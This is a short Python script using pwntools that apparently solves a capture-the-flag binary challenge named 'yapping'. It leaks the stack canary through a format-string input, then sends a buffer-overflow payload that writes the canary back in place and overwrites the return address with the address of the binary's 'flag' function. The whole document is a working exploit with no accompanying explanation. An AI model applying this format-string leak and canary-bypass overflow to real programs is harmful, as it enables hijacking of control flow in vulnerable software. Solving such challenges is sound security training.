from pwn import *

elf = context.binary = ELF('../dist/yapping')
p = process()
log.info(p.clean())

p.sendline(b'%7$p')

leaked_data = p.recvline().strip().decode()
canary_leak = leaked_data.replace("oaoaoaoa", "").strip()
canary = int(canary_leak, 16)
log.success(f'Canary: {hex(canary)}')
flag_func = elf.symbols['flag']

payload = b'A' * 72
payload += p64(canary)  
payload += b'A' * 8   
payload += p64(flag_func)

p.sendline(b'exit')
p.sendline(payload)

print(p.clean().decode('latin-1'))
